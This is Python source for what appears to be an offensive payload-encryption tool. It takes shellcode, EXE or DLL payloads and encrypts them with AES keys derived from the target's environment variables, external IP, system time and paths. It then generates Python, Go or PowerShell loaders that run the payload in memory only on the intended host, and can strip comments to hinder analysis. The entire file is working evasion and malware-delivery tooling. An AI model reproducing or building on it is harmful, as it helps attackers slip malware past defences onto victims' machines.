import hashlib
import sys
import re
import struct
import zlib
import base64
import random
import textwrap
import os
import platform
import StringIO
import binascii
from Crypto.Cipher import AES
from Crypto import Random

from templates.python.payloads import pe_exe
from templates.python.payloads import win_shellcode
from templates.python.payloads import code
from templates.python.payloads import drop_file
from templates.python import env_base
from templates.python import environmentals
from templates.python import external_ip
from templates.python import system_time
from templates.python import system_paths
from templates.go import go_env_base
from templates.go import go_system_time
from templates.go import go_environmentals
from templates.go import go_external_ip
from templates.go import go_system_paths
from templates.go.payloads import go_win_shellcode
from templates.go.payloads import go_memorymodule
from templates.powershell import ps_env_base
from templates.powershell import ps_environmentals
from templates.powershell import ps_system_paths
from templates.powershell import ps_system_time
from templates.powershell import ps_external_ip
from templates.powershell.payloads import ps_code
from templates.powershell.payloads import ps_drop_file
from templates.powershell.payloads import ps_dll_exe
from templates.powershell.payloads import ps_win_shellcode
from cleanup import removeCommentsGo
from cleanup import removeCommentsPy



class env_encrypt:

    def __init__(self, config, payload, payload_type, minus_bytes, output_type, key_iterations,cleanup=False):
        self.org_payload = payload
        self.config = config
        self.payload = open(payload, 'rb').read()
        print "[*] Payload length", len(self.payload)
        self.lookup_table = ''
        self.payload_type = payload_type
        self.minus_bytes = int(minus_bytes)
        self.key_iterations = int(key_iterations)
        self.output_type = output_type
        self.payload_loader = ''
        self.payload_stack = ''
        self.payload_call_stack = ''
        self.go_payload_loader = ''
        self.go_payload_stack = ''
        self.go_payload_call_stack = ''
        self.payload_imports = ''
        self.cleanup = cleanup
        self.file_suffix = ''

        self.go_imports = set()
        self.set_payload()
        if output_type in ['python', 'both']:
            if 'dll' in self.payload_type.lower():
                print "[X] No DLL Support for python"
                sys.exit(-1)
        self.hash_payload()
        self.populate_variables()
        self.find_key_encrypt()
        if self.output_type == 'python':
            self.gen_pyloader()
        elif self.output_type == 'go':
            self.gen_goloader()
        elif self.output_type == 'powershell':
            self.gen_psloader()
            
        
    def set_payload(self):
        print "[*] Payload_type", self.payload_type
        if self.payload_type == "shellcode":
            print '[*] Using shellcode payload template' 
            self.payload_loader = win_shellcode.loader
            self.go_payload_loader = go_win_shellcode.loader
            self.payload_imports = go_win_shellcode.imports
            self.ps_payload_loader = ps_win_shellcode.loader

        elif self.payload_type == "exe":
            print '[*] Using EXE payload template' 
            self.payload_loader = pe_exe.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "dll_x86":
            # go memory module
            print '[*] Using x86 dll payload template' 
            #self.payload_loader = pe_dll_x86.loader
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "dll_x64":
            print "[*] Using x64 dll payload tempate"
            #self.payload_loader = pe_dll_x64.loader
            # go memory module
            self.go_payload_loader = go_memorymodule.loader
            self.payload_imports = go_memorymodule.imports
            self.ps_payload_loader = ps_dll_exe.loader
            
        elif self.payload_type == "code": # python code
            # python only
            self.payload_loader = code.loader
            self.ps_payload_loader = ps_code.loader


        elif self.payload_type == "file_drop":
            if len(os.path.basename(self.org_payload).split('.')) > 2:
                file_suffix = '.' + '.'.join(os.path.basename(self.org_payload).split('.')[1:])
            else:
                filename, file_suffix = os.path.splitext(self.org_payload)

            self.file_suffix = file_suffix
            self.payload_loader = drop_file.loader.format(self.file_suffix)
            self.ps_payload_loader = ps_drop_file.loader.format(self.file_suffix)
            #self.go_payload_loader = go_drop_file.loader

    def hash_payload(self):
        # This is the final hash ADD THE self.payload - minus function
        self.payload_hash = hashlib.sha512(self.payload[:-self.minus_bytes]).hexdigest()

    def populate_variables(self):
        self.used_env_strings = {}
        self.env_strings = ''
        self.env_vars = []
        
        self.used_path_string = {}
        self.path_string = ''
        
        self.start_loc = ''

        self.external_ip_mask = ''

        self.system_time = ''

        for key, value in self.config.iteritems():
            if key.lower() == 'env_var': 
                for _key, _value in value.iteritems():
                    # ok what's populated
                    if _value != '':
                        self.used_env_strings[_key] = _value.lower()
            if key.lower() == 'path':
                # just one path
                for _key, _value in value.iteritems():
                    if _value != '' and 'path' in _key and self.used_path_string == {}:
                        self.used_path_string[_key] = _value.lower().rstrip("\\")
                    elif _key == 'start_loc':
                        self.start_loc = _value.rstrip("\\")
                    else:
                        break
            if key.lower() == 'ip_ranges':
                for _key, _value in value.iteritems():
                    # have to handle multiple interfaces
                    if _value != '' and 'external_ip_mask' in _key:
                        self.external_ip_mask = _value.lower()

            if key.lower() == 'system_time':
                self.system_time = value['Time_Range']


        if self.used_env_strings == {}:
            print "[!] Environment variables not used as part of key"
        else:

            print "[*] Used environment variables:"
            
            for key, value in sorted(self.used_env_strings.items()):
                print "\t[-] environment value used: {0}, value used: {1}".format(key, value)
                self.env_strings += value
                self.env_vars.append(key)
            
        for key, value in sorted(self.used_path_string.items()):
            self.path_string += value
        
        if self.path_string != '':
            print "[*] Path string used as part of key:", self.path_string
        else:
            print "[!] Path string not used as pasrt of key"

        if self.external_ip_mask != '':
            print "[*] External IP mask used as part of key:", self.external_ip_mask
        else:
            print "[!] External IP mask NOT used as part of key"

        if self.system_time != '':
            print "[*] System time mask used as part of key:", self.system_time
        else:
            print "[!] System time mask NOT used as part of key"    

    def pkcs7_encode(self, some_string):
        '''
        Pad an input string according to PKCS#7
        '''
        block = 16
        text_length = len(some_string)
        output = StringIO.StringIO()
        val = block - (text_length % block)
        for _ in xrange(val):
            output.write('%02x' % val)
        return some_string + binascii.unhexlify(output.getvalue())
        
    def find_key_encrypt(self):
        
        # key == [env_strings][external_ip_mask][system_time][[path]OR[reg_path]]

        self.key = self.env_strings + self.external_ip_mask + self.system_time

        if self.path_string != '':
            self.key += self.path_string

        print '[*] String used to source the encryption key:', self.key

        # Do a sha512 has of the key and trim the front 32 bytes
        
        key_iterations = self.key_iterations
        print "[*] Applying %s sha512 hash iterations before encryption" % key_iterations

        while key_iterations > 1:
            self.key = hashlib.sha512(self.key).digest()
            key_iterations -= 1
            
        self.key = hashlib.sha512(self.key).digest()[:32]
        
        print '[*] Encryption key:', self.key.encode('hex')
        self.iv = Random.new().read(AES.block_size)
        
        # Using CFB because we don't have to break it up by blocks or use padding
        if self.output_type == 'python':
            cipher = AES.new(self.key, AES.MODE_CFB, self.iv)
            
            self.encrypted_msg = cipher.encrypt(self.payload)
            print '[*] Length of encrypted payload', len(self.encrypted_msg), 'and hash:', hashlib.sha512(self.encrypted_msg).hexdigest()
            self.lookup_table = zlib.compress(self.iv + self.encrypted_msg)

            # Encrypt payload payload for PYTHON ONLY
            self.payload_loader = base64.b64encode(zlib.compress(cipher.encrypt(self.payload_loader)))
            
        # Gen go formated AES cipher
        elif self.output_type == 'go':
            
            go_block_size = 128

            gocipher = AES.new(
                self.key, 
                AES.MODE_CFB, 
                self.iv,
                # DAMN YOU PYTHON and CFB8
                segment_size=go_block_size
            )

            PADDING="{"
            self.b64_encoded_payload = base64.b64encode(self.payload)
            # Normally you don't have to pad CFB, but go is CFB128 -- python is CFB8
            self.payload = self.b64_encoded_payload + (go_block_size - len(self.b64_encoded_payload) % go_block_size) * PADDING
            
            self.go_encrypted_msg = gocipher.encrypt(self.payload)
            
            self.go_lookup_table = zlib.compress(self.iv + self.go_encrypted_msg)

        elif self.output_type == 'powershell':
            ps_block_size = 128

            pscipher = AES.new(self.key,
                               AES.MODE_CBC,
                               self.iv,
                               segment_size = ps_block_size,
                )

            self.b64_encoded_payload = base64.b64encode(self.payload)
            
            self.ps_encrypted_msg = pscipher.encrypt(self.pkcs7_encode(self.payload))
            
            self.ps_lookup_table = base64.b64encode(self.iv + self.ps_encrypted_msg)
            
            # Must refresh
            self.iv = Random.new().read(AES.block_size)
            pscipher = AES.new(self.key,
                               AES.MODE_CBC,
                               self.iv,
                               segment_size = ps_block_size,
                )

            self.encrypted_loader = pscipher.encrypt(self.pkcs7_encode(self.ps_payload_loader))
            
            self.ps_payload_loader = base64.b64encode(self.iv + self.encrypted_loader)
            
    def write_payload(self):
        if not os.path.exists('./output'):
            os.makedirs('./output')
        
        with open(r'./output/' + self.payload_name, 'w') as f:
            if "go_" in self.payload_name and self.cleanup:
                print "[*] Removing Comments and Print Statements"
                self.payload_output = removeCommentsGo(self.payload_output,removePrint=True)
            elif "python_" in self.payload_name and self.cleanup:
                print "[*] Removing Comments and Print Statements"
                self.payload_output = removeCommentsPy(self.payload_output,removePrint=True)
            elif self.payload_name and self.cleanup:
                print "[!] Error Selecting Type of File for Cleaning : %s" % (self.payload_name)
            f.write(self.payload_output)

    def gen_pyloader(self):
        
        self.payload_name = 'python_symmetric_' + os.path.basename(self.org_payload) + ".py"
        print '[*] Payload hash (minus_bytes):', self.payload_hash
        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()

        print "[*] Writing Python payload to:", self.payload_name
        
        # Populate code to patch into build script
        if self.env_strings != '':
            self.payload_stack += environmentals.buildcode
            self.payload_call_stack += "env_vars = {0}".format(self.env_vars)
            self.payload_call_stack += environmentals.callcode
        if self.external_ip_mask != '':
            self.payload_stack += external_ip.buildcode
            self.payload_call_stack += external_ip.callcode
        if self.system_time != '':
            self.payload_stack += system_time.buildcode
            self.payload_call_stack += system_time.callcode
        # pass a list of all possible env + external_ip + system_time combos to walk path/reg funcs

        # assemble key combos
        if self.path_string != '':
            self.payload_stack += system_paths.buildcode
            # Add a payload call stack
            self.payload_call_stack += system_paths.callcode
        else:
            # Don't walk path or registry
            self.payload_call_stack += """    build_code(lookup_table, payload_hash, minus_bytes, key_combos, key_iterations).run()"""#.format(self.env_vars)

        self.payload_output = env_base.buildcode.format(base64.b64encode(self.lookup_table), self.payload_hash, 
                                                             self.minus_bytes, self.payload_loader, 
                                                             self.start_loc, self.payload_stack, 
                                                             self.payload_call_stack, self.key_iterations)

        self.write_payload()

    def gen_goloader(self):
        self.import_set = set(["bytes",
                               "os",        # needed for memory module
                               "unsafe",    # needed for memory module
                               "io",
                               "fmt",
                               "encoding/hex",
                               "compress/zlib",
                               "crypto/sha512",
                               "encoding/base64",
                               "crypto/aes",
                               "crypto/cipher"])

        # add any paylaod_imports 
        if self.payload_imports != '':
            for item in self.payload_imports: self.import_set.add(item)


        count = 0
        self.payload_name = 'go_symmetric_' + os.path.basename(self.org_payload) + '.go'
        
        print '[*] Writing GO payload to:', self.payload_name

        if self.env_strings != '':
            for item in go_environmentals.imports: self.import_set.add(item)
            self.go_payload_stack += go_environmentals.buildcode
            self.go_payload_call_stack += "env_vars := []string{{\"{0}\"}}\n".format("\", \"".join(self.env_vars))
            self.go_payload_call_stack += go_environmentals.callcode
            count += 1
        if self.external_ip_mask != '':
            for item in go_external_ip.imports: self.import_set.add(item)
            self.go_payload_stack += go_external_ip.buildcode
            self.go_payload_call_stack += go_external_ip.callcode
            count += 1
        if self.system_time != '':
            for item in go_system_time.imports: self.import_set.add(item)
            self.go_payload_stack += go_system_time.buildcode
            self.go_payload_call_stack += go_system_time.callcode
            count += 1
        if self.path_string != '':
            for item in go_system_paths.imports: self.import_set.add(item)
            self.go_payload_stack += go_system_paths.buildcode
            self.go_payload_call_stack += go_system_paths.callcode
            count += 1
        
        else:
            # Don't walk path or registry
            self.go_payload_call_stack += """\tfull_payload := build_code(lookup_table, payload_hash, minus_bytes, key_combos)\n\tif full_payload == nil{{\n\t\tfmt.Println(":C Did not decrypt. Bye!")\n\t\tos.Exit(1)\n\t}}\n\tfmt.Println("Len full_payload:", len(full_payload))"""


        go_imports = ''
        
        for item in self.import_set:         
            go_imports += "\"" + item + "\"\n\t"

        self.payload_output = go_env_base.buildcode.format(base64.b64encode(self.go_lookup_table), self.payload_hash, 
                                                             self.minus_bytes, self.go_payload_loader, 
                                                             self.start_loc, self.go_payload_stack, 
                                                             self.go_payload_call_stack, count, go_imports,
                                                             self.key_iterations,int(self.key_iterations))
        self.write_payload()


    def gen_psloader(self):
        self.payload_name = 'powershell_symmetric_' + os.path.basename(self.org_payload) + ".ps1"
        print '[*] Payload hash (minus_bytes):', self.payload_hash
        print '[*] Hash of full payload:', hashlib.sha512(self.payload).hexdigest()

        print "[*] Writing Powershell payload to:", self.payload_name
        
        # Populate code to patch into build script
        if self.env_strings != '':
            self.payload_stack += ps_environmentals.buildcode
            self.payload_call_stack += "$env_vars = @(\"{0}\")".format("\", \"".join(self.env_vars))
            self.payload_call_stack += ps_environmentals.callcode
        
        if self.external_ip_mask != '':
            self.payload_stack += ps_external_ip.buildcode
            self.payload_call_stack += ps_external_ip.callcode
        if self.system_time != '':
            self.payload_stack += ps_system_time.buildcode
            self.payload_call_stack += ps_system_time.callcode
        
        # pass a list of all possible env + external_ip + system_time combos to walk path/reg funcs

        # assemble key combos

        if self.path_string != '':
            self.payload_stack += ps_system_paths.buildcode
            # Add a payload call stack
            self.payload_call_stack += ps_system_paths.callcode
        else:
            # Don't walk path or registry
            self.payload_call_stack += """    Get-R-Done $lookup_table $payload_hash $minus_bytes $key_combos $key_iterations"""#.format(self.env_vars)

        self.payload_output = ps_env_base.buildcode.format(self.ps_lookup_table, self.payload_hash, 
                                                             self.minus_bytes, self.ps_payload_loader, 
                                                             self.start_loc, self.payload_stack, 
                                                             self.payload_call_stack, self.key_iterations
                                                             )

        self.write_payload()

